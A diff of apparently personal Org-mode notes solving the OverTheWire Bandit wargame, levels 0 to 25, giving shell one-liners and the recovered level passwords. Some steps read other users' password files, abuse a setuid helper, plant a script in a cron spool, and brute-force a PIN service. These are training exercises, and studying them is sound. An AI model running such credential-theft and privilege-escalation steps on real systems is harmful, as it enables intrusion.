@@ -1,11 +1,115 @@
 #+TITLE: Bandit from OverTheWire
 
 
+* Intro
+#+BEGIN_SRC text
+                         _                     _ _ _
+                        | |__   __ _ _ __   __| (_) |_
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+
+
+                      This is an OverTheWire game server.
+            More information on http://www.overthewire.org/wargames
+
+bandit0@bandit.labs.overthewire.org's password:
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * peda (https://github.com/longld/peda.git) in /opt/peda/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+ Both python2 and python3 are installed.
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+#+END_SRC
+
+
 * DONE Level 0
 CLOSED: [2019-04-16 Tue 22:34]
+:LOGBOOK:
+- Note taken on [2023-09-10 Sun 12:26] \\
+  Le mot de passe est ~bandit0~
+:END:
 
 #+NAME: test-connect
-#+HEADER: :dir /-:bandit0@bandit.labs.overthewire.org#2220:
+#+HEADER: :dir /ssh:bandit0@bandit.labs.overthewire.org#2220:
 #+BEGIN_SRC sh
 id
 #+END_SRC
@@ -13,353 +117,349 @@ id
 #+RESULTS: test-connect
 : uid=11000(bandit0) gid=11000(bandit0) groups=11000(bandit0)
 
+
 * DONE Level 0 → Level 1
 CLOSED: [2019-04-17 Wed 00:16]
 
-#+NAME: pass-1
-#+HEADER: :dir /-:bandit0@bandit.labs.overthewire.org#2220:
+#+NAME: pass-bandit1
+#+HEADER: :dir /ssh:bandit0@bandit.labs.overthewire.org#2220:
 #+BEGIN_SRC sh
 cat ~/readme
 #+END_SRC
 
 #+RESULTS: pass-1
-: boJ9jbbUNNfktd78OOpsqOltutMc3MY1
+: NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
 
 * DONE Level 1 → Level 2
 CLOSED: [2019-04-17 Wed 00:18]
 
-#+NAME: pass-2
-#+HEADER: :dir /-:bandit1@bandit.labs.overthewire.org#2220:
+#+NAME: pass-bandit2
+#+HEADER: :dir /ssh:bandit1@bandit.labs.overthewire.org#2220:
 #+BEGIN_SRC sh
 cat ./-
 #+END_SRC
 
-#+RESULTS: pass-2
-: CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
+#+RESULTS: pass-bandit2
+: rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi
 
 * DONE Level 2 → Level 3
 CLOSED: [2019-04-17 Wed 00:19]
 
-#+NAME: pass-3
-#+HEADER: :dir /-:bandit2@bandit.labs.overthewire.org#2220:
+#+NAME: pass-bandit3
+#+HEADER: :dir /ssh:bandit2@bandit.labs.overthewire.org#2220:
 #+BEGIN_SRC sh
 cat 'spaces in this filename'
 #+END_SRC
 
-#+RESULTS: pass-3
-: UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
+#+RESULTS: pass-bandit3
+: aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG
 
 * DONE Level 3 → Level 4
 CLOSED: [2019-04-17 Wed 00:25]
 
-#+NAME: pass-4
-#+HEADER: :dir /-:bandit3@bandit.labs.overthewire.org#2220:
+#+NAME: pass-bandit4
+#+HEADER: :dir /ssh:bandit3@bandit.labs.overthewire.org#2220:
 #+BEGIN_SRC sh
 cat inhere/.hidden
 #+END_SRC
 
-#+RESULTS: pass-4
-: pIwrPrtPN36QITSp3EQaw936yaFoFgAB
+#+RESULTS: pass-bandit4
+: 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe
 
 * DONE Level 4 → Level 5
 CLOSED: [2019-04-17 Wed 00:37]
 
-#+NAME: pass-5
-#+HEADER: :dir /-:bandit4@bandit.labs.overthewire.org#2220:
+#+NAME: pass-bandit5
+#+HEADER: :dir /ssh:bandit4@bandit.labs.overthewire.org#2220:
 #+BEGIN_SRC sh
-for f in inhere/-file*; do file $f | grep text; done
+for f in inhere/-file*; do
+    cat $(file $f | awk -F':' '/ASCII text$/ {print $1}')
+done
 #+END_SRC
 
-#+RESULTS: pass-5
-: koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+#+RESULTS: pass-bandit5
+: lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR
+
 
 * DONE Level 5 → Level 6
 CLOSED: [2019-04-17 Wed 00:38]
 
-#+NAME: pass-6
-#+HEADER: :dir /-:bandit5@bandit.labs.overthewire.org#2220:
+#+NAME: pass-bandit6
+#+HEADER: :dir /ssh:bandit5@bandit.labs.overthewire.org#2220:
 #+BEGIN_SRC sh
-find . -type f -readable \! -executable -size 1033c -exec cat '{}' \;
+find inhere/ -type f -readable \! -executable -size 1033c -exec head --lines=1 '{}' \;
 #+END_SRC
 
-#+RESULTS: pass-6
-: DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+#+RESULTS: pass-bandit6
+: P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU
 
 * DONE Level 6 → Level 7
 CLOSED: [2019-04-17 Wed 00:40]
 
-#+NAME: pass-7
-#+HEADER: :dir /-:bandit6@bandit.labs.overthewire.org#2220:
+#+NAME: pass-bandit7
+#+HEADER: :dir /ssh:bandit6@bandit.labs.overthewire.org#2220:
 #+BEGIN_SRC sh
 find / -type f -size 33c -user bandit7 -group bandit6 -exec cat '{}' \; 2> /dev/null
 #+END_SRC
 
-#+RESULTS: pass-7
-: HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+#+RESULTS: pass-bandit7
+: z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S
 
 * DONE Level 7 → Level 8
 CLOSED: [2019-04-17 Wed 00:41]
 
-#+NAME: pass-8
-#+HEADER: :dir /-:bandit7@bandit.labs.overthewire.org#2220:
+#+NAME: pass-bandit8
+#+HEADER: :dir /ssh:bandit7@bandit.labs.overthewire.org#2220:
 #+BEGIN_SRC sh
-grep millionth data.txt | cut -f 2
+awk '/^millionth/ { print $2 }' data.txt
 #+END_SRC
 
-#+RESULTS: pass-8
-: cvX2JJa4CFALtqS87jk27qwqGhBM9plV
+#+RESULTS: pass-bandit8
+: TESKZC0XvTetK0S9xNwm25STk5iWrBvP
 
 * DONE Level 8 → Level 9
 CLOSED: [2019-04-17 Wed 00:45]
 
-#+NAME: pass-9
-#+HEADER: :dir /-:bandit8@bandit.labs.overthewire.org#2220:
+#+NAME: pass-bandit9
+#+HEADER: :dir /ssh:bandit8@bandit.labs.overthewire.org#2220:
 #+BEGIN_SRC sh
 sort data.txt | uniq -u
 #+END_SRC
 
-#+RESULTS: pass-9
-: UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
+#+RESULTS: pass-bandit9
+: EN632PlfYiZbn3PhVK3XOGSlNInNE00t
 
 * DONE Level 9 → Level 10
 CLOSED: [2019-04-17 Wed 00:48]
 
-#+NAME: pass-10
-#+HEADER: :dir /-:bandit9@bandit.labs.overthewire.org#2220:
+#+NAME: pass-bandit10
+#+HEADER: :dir /ssh:bandit9@bandit.labs.overthewire.org#2220:
 #+BEGIN_SRC sh
 strings data.txt | grep -E '^=+ [[:alnum:]]{10,}$' | cut -d ' ' -f 2
 #+END_SRC
 
-#+RESULTS: pass-10
-: truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+#+RESULTS: pass-bandit10
+: G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
 
 * DONE Level 10 → Level 11
 CLOSED: [2019-04-17 Wed 00:49]
 
-#+NAME: pass-11
-#+HEADER: :dir /-:bandit10@bandit.labs.overthewire.org#2220:
+#+NAME: pass-bandit11
+#+HEADER: :dir /ssh:bandit10@bandit.labs.overthewire.org#2220:
 #+BEGIN_SRC sh
 base64 -d data.txt | cut -d ' ' -f 4
 #+END_SRC
 
-#+RESULTS: pass-11
-: IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
+#+RESULTS: pass-bandit11
+: 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM
 
 * DONE Level 11 → Level 12
 CLOSED: [2019-04-17 Wed 00:50]
 
-#+NAME: pass-12
-#+HEADER: :dir /-:bandit11@bandit.labs.overthewire.org#2220:
+#+NAME: pass-bandit12
+#+HEADER: :dir /ssh:bandit11@bandit.labs.overthewire.org#2220:
 #+BEGIN_SRC sh
 tr 'a-zA-Z' 'n-za-mN-ZA-M' < data.txt | cut -d ' ' -f 4
 #+END_SRC
 
-#+RESULTS: pass-12
-: 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+#+RESULTS: pass-bandit12
+: JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv
 
 * DONE Level 12 → Level 13
 CLOSED: [2019-04-17 Wed 01:06]
 
-#+NAME: pass-13
-#+HEADER: :dir /-:bandit12@bandit.labs.overthewire.org#2220:
+#+NAME: pass-bandit13
+#+HEADER: :dir /ssh:bandit12@bandit.labs.overthewire.org#2220:
 #+BEGIN_SRC sh
-mkdir -p /tmp/dkrm
-cd /tmp/dkrm
-xxd -r ~/data.txt > data.bin
-gunzip < data.bin > data2.bin
-bunzip2 --stdout data2.bin > data3.bin
-gunzip < data3.bin > data4.bin
-tar xf data4.bin
-bunzip2 --stdout data6.bin > data7.bin
-tar xf data7.bin
-gunzip < data8.bin > data9.bin
-cut -d ' ' -f 4 data9.bin
+xxd -r data.txt \
+    | gunzip \
+    | bunzip2 --stdout \
+    | gunzip \
+    | tar --extract --to-stdout \
+    | tar --extract --to-stdout \
+    | bunzip2 --stdout \
+    | tar --extract --to-stdout \
+    | gunzip \
+    | cut -d ' ' -f 4
 #+END_SRC
 
-#+RESULTS: pass-13
-: 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+#+RESULTS: pass-bandit13
+: wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw
 
 * DONE Level 13 → Level 14
 CLOSED: [2019-04-17 Wed 01:10]
 
-#+NAME: pass-14
-#+HEADER: :dir /-:bandit13@bandit.labs.overthewire.org#2220:
+#+NAME: pass-bandit14
+#+HEADER: :dir /ssh:bandit13@bandit.labs.overthewire.org#2220:
 #+BEGIN_SRC sh
-ssh bandit14@localhost -i sshkey.private -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no cat /etc/bandit_pass/bandit14
+ssh -p 2220 bandit14@localhost -i sshkey.private -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no cat /etc/bandit_pass/bandit14
 #+END_SRC
 
-#+RESULTS: pass-14
-: 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+#+RESULTS: pass-bandit14
+: fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq
 
 * DONE Level 14 → Level 15
 CLOSED: [2019-04-17 Wed 01:17]
 
-#+NAME: pass-15
-#+HEADER: :dir /-:bandit14@bandit.labs.overthewire.org#2220:
-#+HEADER: :var pass=pass-14
+#+NAME: pass-bandit15
+#+HEADER: :dir /ssh:bandit14@bandit.labs.overthewire.org#2220:
+#+HEADER: :var pass=pass-bandit14
 #+BEGIN_SRC sh
 echo $pass | nc localhost 30000 | tail -n2
 #+END_SRC
 
-#+RESULTS: pass-15
-: BfMYroe26WYalil77FoDi9qh59eK5xNr
+#+RESULTS: pass-bandit15
+: jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt
 
 * DONE Level 15 → Level 16
 CLOSED: [2019-04-17 Wed 01:19]
 
-#+NAME: pass-16
-#+HEADER: :dir /-:bandit15@bandit.labs.overthewire.org#2220:
-#+HEADER: :var pass=pass-15
+#+NAME: pass-bandit16
+#+HEADER: :dir /ssh:bandit15@bandit.labs.overthewire.org#2220:
+#+HEADER: :var pass=pass-bandit15
 #+BEGIN_SRC sh
-echo $pass | openssl s_client -connect localhost:30001 -quiet | tail -n2
+echo $pass | openssl s_client -connect localhost:30001 -quiet 2>/dev/null | tail -n2
 #+END_SRC
 
-#+RESULTS: pass-16
-: cluFn7wTiGryunymYOu4RcffSxQluehd
+#+RESULTS: pass-bandit16
+: JQttfApK4SeyHwDlI9SXGR50qclOAil1
 
 * DONE Level 16 → Level 17
 CLOSED: [2019-04-17 Wed 01:44]
 
-#+NAME: pass-17
-#+HEADER: :dir /-:bandit16@bandit.labs.overthewire.org#2220:
-#+HEADER: :var pass=pass-16
+#+NAME: pass-bandit17
+#+HEADER: :dir /ssh:bandit16@bandit.labs.overthewire.org#2220:
+#+HEADER: :var pass=pass-bandit16 port=31790
 #+BEGIN_SRC sh
-#nmap localhost -sV -p31000-32000
-mkdir -p /tmp/dkrm-bandit17
-cd /tmp/dkrm-bandit17
-echo $pass | openssl s_client -connect localhost:31790 -quiet | tail -n +2 > ssh-key
-chmod 600 ssh-key
-ssh bandit17@localhost -i ssh-key -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no cat /etc/bandit_pass/bandit17
+# port=$(nmap -n -sV -p31000-32000 --version-light localhost | awk -F'/' '/ssl\/unknown/ { $1 }')
+cd $(mktemp --directory)
+echo $pass | openssl s_client -connect localhost:$port -quiet 2>/dev/null | tail -n+2 > key
+chmod 600 key
+ssh -i key -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -p 2220 bandit17@localhost 2>/dev/null cat /etc/bandit_pass/bandit17
 #+END_SRC
 
-#+RESULTS: pass-17
-: xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
+#+RESULTS: pass-bandit17
+: VwOSWtCA7lRKkTfbr2IDh6awj9RNZM5e
 
 * DONE Level 17 → Level 18
 CLOSED: [2019-04-17 Wed 01:51]
 
-#+NAME: pass-18
-#+HEADER: :dir /-:bandit17@bandit.labs.overthewire.org#2220:
+#+NAME: pass-bandit18
+#+HEADER: :dir /ssh:bandit17@bandit.labs.overthewire.org#2220:
 #+BEGIN_SRC sh
-sort passwords.old passwords.new | uniq -u | tail -n 1
+diff passwords.old passwords.new | awk '/^>/ { print $2 }'
 #+END_SRC
 
-#+RESULTS: pass-18
-: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+#+RESULTS: pass-bandit18
+: hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg
 
 * DONE Level 18 → Level 19
 CLOSED: [2019-04-17 Wed 01:55]
 
-This level can not be automatized. The following command must be entered in an interactive shell:
-#+NAME: pass-19
+This level can not be automatized. The following command must be entered in a local interactive shell:
+#+NAME: pass-bandit19
 #+BEGIN_SRC sh
-ssh bandit18@bandit.labs.overthewire.org cat readme
+ssh -p 2220 bandit18@bandit.labs.overthewire.org cat readme
 #+END_SRC
 
-#+RESULTS: pass-19
-: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+#+RESULTS: pass-bandit19
+: awhqfNnAbc1naukrpqDYcF95h7HoMTrC
 
 * DONE Level 19 → Level 20
 CLOSED: [2019-04-17 Wed 01:57]
 
-#+NAME: pass-20
-#+HEADER: :dir /-:bandit19@bandit.labs.overthewire.org#2220:
+#+NAME: pass-bandit20
+#+HEADER: :dir /ssh:bandit19@bandit.labs.overthewire.org#2220:
 #+BEGIN_SRC sh
 ./bandit20-do cat /etc/bandit_pass/bandit20
 #+END_SRC
 
-#+RESULTS: pass-20
-: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+#+RESULTS: pass-bandit20
+: VxCazJaVykI6W36BkBU0mJTCM8rR95XT
 
 * DONE Level 20 → Level 21
 CLOSED: [2019-04-17 Wed 02:12]
 
-#+NAME: pass-21
-#+HEADER: :dir /-:bandit20@bandit.labs.overthewire.org#2220:
-#+HEADER: :var pass=pass-20
+#+NAME: pass-bandit21
+#+HEADER: :dir /ssh:bandit20@bandit.labs.overthewire.org#2220:
+#+HEADER: :var pass=pass-bandit20
 #+BEGIN_SRC sh
-mkdir -p /tmp/dkrm-bandit20
-cd /tmp/dkrm-bandit20
-echo $pass | nc -l localhost -p 4444 >pass &
+echo $pass | nc -l localhost 4444 &
 ~/suconnect 4444 >/dev/null
-cat pass
 #+END_SRC
 
-#+RESULTS: pass-21
-: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+#+RESULTS: pass-bandit21
+: NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
 
 * DONE Level 21 → Level 22
 CLOSED: [2019-04-17 Wed 02:17]
 
-#+NAME: pass-22
-#+HEADER: :dir /-:bandit21@bandit.labs.overthewire.org#2220:
+#+NAME: pass-bandit22
+#+HEADER: :dir /ssh:bandit21@bandit.labs.overthewire.org#2220:
 #+BEGIN_SRC sh
-script=$(grep /usr/bin /etc/cron.d/cronjob_bandit22 | head -n1 | cut -d ' ' -f 3)
-cat $(grep bandit_pass "${script}" | cut -d ' ' -f 4)
+script=$(head -n1 /etc/cron.d/cronjob_bandit22 | cut -d ' ' -f 3)
+cat $(awk '/^cat/{ print $NF }' $script)
 #+END_SRC
 
-#+RESULTS: pass-22
-: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+#+RESULTS: pass-bandit22
+: WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
 
 * DONE Level 22 → Level 23
 CLOSED: [2019-04-17 Wed 02:23]
 
-#+NAME: pass-23
-#+HEADER: :dir /-:bandit22@bandit.labs.overthewire.org#2220:
+#+NAME: pass-bandit23
+#+HEADER: :dir /ssh:bandit22@bandit.labs.overthewire.org#2220:
 #+BEGIN_SRC sh
-cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
+cat $(sed 's/\$myname/bandit23/g' /usr/bin/cronjob_bandit23.sh | sh 2>/dev/null | awk '{ print $NF }')
 #+END_SRC
 
-#+RESULTS: pass-23
-: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+#+RESULTS: pass-bandit23
+: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
 
 * DONE Level 23 → Level 24
 CLOSED: [2019-04-17 Wed 02:42]
 
-#+NAME: pass-24
-#+HEADER: :dir /-:bandit23@bandit.labs.overthewire.org#2220:
+#+NAME: pass-bandit24
 #+BEGIN_SRC sh
-cat > /var/spool/bandit24/get-pass << EOF
+tempfile=$(mktemp)
+
+cat > /var/spool/bandit24/foo/getpass << EOF
 #!/bin/sh
 
-mkdir -p /tmp/dkrm-bandit24
-cat /etc/bandit_pass/bandit24 > /tmp/dkrm-bandit24/pass
+cat /etc/bandit_pass/bandit24 > $tempfile
 EOF
 
-chmod +x /var/spool/bandit24/get-pass
-sleep 60 && cat /tmp/dkrm-bandit24/pass
+chmod +x /var/spool/bandit24/foo/getpass
+sleep 60
+cat $tempfile
 #+END_SRC
 
-#+RESULTS: pass-24
-: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+#+RESULTS: pass-bandit24
+: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
 
 * DONE Level 24 → Level 25
 CLOSED: [2019-04-17 Wed 10:53]
 
-#+NAME: pass-25
-#+HEADER: :dir /-:bandit24@bandit.labs.overthewire.org#2220:
-#+HEADER: :var pass=pass-24
+For some reason the daemon stop outputting after some numbers. So I limit the range of numbers to check.
+
+#+NAME: pass-bandit25
+#+HEADER: :dir /ssh:bandit24@bandit.labs.overthewire.org#2220:
+#+HEADER: :var pass_bandit24='VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar'
 #+BEGIN_SRC sh
-mkdir -p /tmp/dkrm-bandit25
-cd       /tmp/dkrm-bandit25
-
-for i in $(seq -w 0 9999)
-do
-    echo "$pass $i" >> brute
-done
-
-nc localhost 30002 < brute | grep -v Wrong
+seq --format "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar %04g" 8000 9999 \
+    | nc localhost 30002 \
+    | awk '/^The password/ { print $7 }'
 #+END_SRC
 
-#+RESULTS: pass-25
-: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+#+RESULTS: pass-bandit25
+: p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
 
-* TODO Level 25 → Level 26
-* TODO Level 26 → Level 27
-* TODO Level 27 → Level 28
-* TODO Level 28 → Level 29
-* TODO Level 29 → Level 30
-* TODO Level 30 → Level 31
-* TODO Level 31 → Level 32
-* TODO Level 32 → Level 33
-* TODO Level 33 → Level 34
+* BACKLOG Level 25 → Level 26
+* BACKLOG Level 26 → Level 27
+* BACKLOG Level 27 → Level 28
+* BACKLOG Level 28 → Level 29
+* BACKLOG Level 29 → Level 30
+* BACKLOG Level 30 → Level 31
+* BACKLOG Level 31 → Level 32
+* BACKLOG Level 32 → Level 33
+* BACKLOG Level 33 → Level 34
